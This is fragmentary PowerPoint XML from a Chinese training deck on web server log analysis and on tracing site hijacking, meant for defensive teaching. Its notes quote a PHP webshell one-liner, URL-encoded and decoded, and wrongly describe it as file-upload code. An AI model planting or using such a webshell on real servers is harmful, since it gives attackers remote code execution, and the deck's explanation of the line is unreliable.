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49" r:id="rId3"/>
    <p:sldId id="5118" r:id="rId5"/>
    <p:sldId id="3350" r:id="rId6"/>
    <p:sldId id="3351" r:id="rId7"/>
    <p:sldId id="3352" r:id="rId8"/>
    <p:sldId id="3353" r:id="rId9"/>
    <p:sldId id="3354" r:id="rId10"/>
    <p:sldId id="3355" r:id="rId11"/>
    <p:sldId id="3356" r:id="rId12"/>
    <p:sldId id="3358" r:id="rId13"/>
    <p:sldId id="3359" r:id="rId14"/>
    <p:sldId id="3360" r:id="rId15"/>
    <p:sldId id="3361" r:id="rId16"/>
    <p:sldId id="3362" r:id="rId17"/>
    <p:sldId id="3363" r:id="rId18"/>
    <p:sldId id="3364" r:id="rId19"/>
    <p:sldId id="3365" r:id="rId20"/>
    <p:sldId id="3366" r:id="rId21"/>
    <p:sldId id="3367" r:id="rId22"/>
    <p:sldId id="3368" r:id="rId23"/>
    <p:sldId id="3369" r:id="rId24"/>
    <p:sldId id="3370" r:id="rId25"/>
    <p:sldId id="3371" r:id="rId26"/>
    <p:sldId id="3372" r:id="rId27"/>
    <p:sldId id="3373" r:id="rId28"/>
    <p:sldId id="5117" r:id="rId29"/>
    <p:sldId id="3375" r:id="rId30"/>
    <p:sldId id="3377" r:id="rId31"/>
    <p:sldId id="3378" r:id="rId32"/>
    <p:sldId id="3379" r:id="rId33"/>
    <p:sldId id="3380" r:id="rId34"/>
    <p:sldId id="3381" r:id="rId35"/>
    <p:sldId id="3382" r:id="rId36"/>
    <p:sldId id="3383" r:id="rId37"/>
    <p:sldId id="3384" r:id="rId38"/>
    <p:sldId id="3385" r:id="rId39"/>
    <p:sldId id="3386" r:id="rId40"/>
    <p:sldId id="3391" r:id="rId41"/>
    <p:sldId id="3392" r:id="rId42"/>
    <p:sldId id="3393" r:id="rId43"/>
    <p:sldId id="3394" r:id="rId44"/>
    <p:sldId id="3395" r:id="rId45"/>
    <p:sldId id="3396" r:id="rId46"/>
    <p:sldId id="3397" r:id="rId47"/>
    <p:sldId id="3398" r:id="rId48"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:custDataLst>
    <p:tags r:id="rId5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oming" initials="l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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="tags/tag1.xml"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/commentAuthors" Target="commentAuthors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2.xml"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps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BD076D-B6A7-44E6-BF38-062F461E8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212921-4351-4848-8CF3-25AAD728135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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147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46B4A55-A09C-4438-B9E2-8668898DC385}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN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ea"/>
                <a:sym typeface="+mn-ea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ea"/>
              <a:sym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%systemroot%是一个Windows操作系统的环境变量，它指向Windows系统安装目录的路径。在大多数情况下，它的默认路径是C:\Windows。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网卡</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>配置：网络</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>适配器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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147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46B4A55-A09C-4438-B9E2-8668898DC385}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN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NGAF 是 "Next-Generation Application Firewall" 的缩写，全称为 "下一代应用防火墙"</a:t>
            </a:r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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147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46B4A55-A09C-4438-B9E2-8668898DC385}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN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%3C%3Fphp+%24_FILES%5B%27a%27%5D%28%24_FILES%5B%27b%27%5D%29%3B%3F%3E</a:t>
            </a:r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&lt;?php+$_FILES['a']($_FILES['b']);?&gt;</a:t>
            </a:r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这段代码是PHP语言中的一行代码，主要是用于文件上传的功能。其中，$_FILES数组是用于</a:t>
            </a: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从客户端上传的文件中获取相关信息的数组</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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，'a’和’b’是两个数组元素的键名，分别表示</a:t>
            </a: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文件的name</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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和tmp_name属性，而括号内的代码则是在服务器上</a:t>
            </a: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对上传的文件进行操作的代码</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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。需要注意的是，该代码存在安全风险，可能会被恶意利用</a:t>
            </a:r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Acunetix 是一种著名的网络安全工具，专门用于网络应用的安全扫描和漏洞检测</a:t>
            </a:r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客户端软件</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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相关信息 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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 prompt弹出一个对话框，提示用户输入信息    -</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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q 静默模式   -c 从上次中断的地方继续下载文件      </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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0（标准输入）</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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 1（标准输出） 2（标准错误）</a:t>
            </a:r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存储Apache服务器的基本</a:t>
            </a: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认证信息</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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的文件:用户名和密码  </a:t>
            </a:r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图形</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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渲染</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" alt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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147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46B4A55-A09C-4438-B9E2-8668898DC385}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN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+mn-ea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C0D88-6A2E-E747-9634-F302DB9CD7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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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1A05-0A1A-4D44-8CF7-B187E4A799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B3DA-53A0-4AD5-88D3-3A09598483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 userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815413" y="1052513"/>
            <a:ext cx="10752667" cy="0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8577" y="381000"/>
            <a:ext cx="10972800" cy="8509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pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="WechatIMG10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2437" y="443072"/>
            <a:ext cx="2091267" cy="54737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51A05-0A1A-4D44-8CF7-B187E4A799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DB3DA-53A0-4AD5-88D3-3A095984838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hyperlink" Target="https://baike.baidu.com/pic/WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210/0/d56b3634d8d850285bb5f5fc?fr=lemma&amp;ct=single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3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wmf"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject4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wmf"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject5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wmf"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject6.bin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wmf"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject7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e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文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3436057" y="1854071"/>
            <a:ext cx="4824586" cy="882933"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="5400" b="1" dirty="0">
                <a:gradFill>
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="6FBA2C"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="00479D"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="36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5400" b="1" dirty="0">
                <a:gradFill>
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="6FBA2C"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="00479D"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="36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日志分析</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0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2273300" y="1052513"/>
            <a:ext cx="8064500" cy="0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117975" y="3045707"/>
            <a:ext cx="6096000" cy="1965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WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>简介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/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>日志存储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分析思路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71550"/>
            <a:ext cx="10515600" cy="5205413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>服务器简介</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器也称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>WWW(WORLD WIDE WEB)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器，主要功能是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>提供网上信息浏览服务</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>。 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>WWW </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>的多媒体信息查询工具，是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>上近年才发展起来的服务，也是发展最快和目前用的最广泛的服务。正是因为有了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>WWW</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>工具，才使得近年来 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>迅速发展，且用户数量飞速增长</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" alt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047749" y="2254689"/>
            <a:ext cx="943927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Web服务器是可以向发出请求的浏览器提供文档的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程序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1、服务器是一种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被动程序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：只有当Internet上运行其他计算机中的浏览器发出的请求时，服务器才会响应。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、最常用的Web服务器是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Apache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和Microsoft的Internet信息服务器（Internet Information Services，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IIS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）。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3、Internet上的服务器也称为Web服务器，是一台在Internet上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具有独立IP地址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的计算机，可以向Internet上的客户机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提供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WWW、Email和FTP等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各种Internet服务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、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服务器是指驻留于因特网上某种类型计算机的程序。当Web浏览器（客户端）连到服务器上并请求文件时，服务器将处理该请求并将文件反馈到该浏览器上，附带的信息会告诉浏览器如何查看该文件（即文件类型）。服务器使用HTTP（超文本传输协议）与客户机浏览器进行信息交流，这就是人们常把它们称为HTTP服务器的原因。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0" name="Picture 6">
            <a:hlinkClick r:id="rId1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2426" y="5210174"/>
            <a:ext cx="3333750" cy="135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/>
                </a:solidFill>
              </a:rPr>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>日志存储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600" dirty="0" err="1"/>
              <a:t>apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器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Windows: &lt;Apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>安装目录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>&gt;\logs\access.log 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Linux:  /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>/local/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>/logs/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>access_log</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>若不存在，参考</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>配置文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>httpd.conf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>中相关配置</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>tomcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>日志文件通常位于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Tomcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>安装目录下的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>logs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>文件夹内，若不存在，则参考</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Tomcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>配置文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>Server.xml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>中的相关配置，如：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600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855643" y="4437112"/>
          <a:ext cx="5681167" cy="833120"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5681167"/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&lt;Valve className="org.apache.catalina.valves.AccessLogValve"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directory="logs"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prefix="localhost_access_log." suffix=".txt"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pattern="common" resolveHosts="false"/&gt;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/>
                </a:solidFill>
              </a:rPr>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>日志存储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600"/>
              <a:t>IIS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>默认位置：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" err="1"/>
              <a:t>systemroot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>%\system32\logfiles\ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>可自由设置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/>
              <a:t>默认日志命名方式：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>ex+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>年份的末两位数字</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>月份</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>日期</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>+.log</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" err="1"/>
              <a:t>nginx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器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/>
              <a:t>日志存储路径在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>Nginx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>配置文件中，其中：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 err="1"/>
              <a:t>access_log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>变量规定了日志存放路径与名字，以及日志格式名称，默认值</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" err="1"/>
              <a:t>access_log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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分析思路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600" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>、第一步我们需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>找到现象发生</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>的位置。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>根据整个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应用数据流逻辑</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>找对应风险点。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>HOSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>文件：被篡改，访问正常域名，错误解析会跳转到非法网站。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>网卡</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>配置：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>配置被修改，指向恶意的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器也可造成错误解析。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>终端发起</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>解析请求：局域网</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>劫持，也是跳转到非法网站。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>域名服务商：在域名服务商那注册的账号泄露，导致域名对应</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>被修改。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>CDN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器污染：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>CDN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>缓存未更新，还是缓存被挂黑链时的页面。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>服务器端：服务器被篡改，也是遇到最多的情况，需要找到在服务器上被篡改的位置。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>搜索引擎：快照污染，导致通过搜索引擎搜索时，快照里还缓存着黑链页面。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分析思路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 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5665" y="1825625"/>
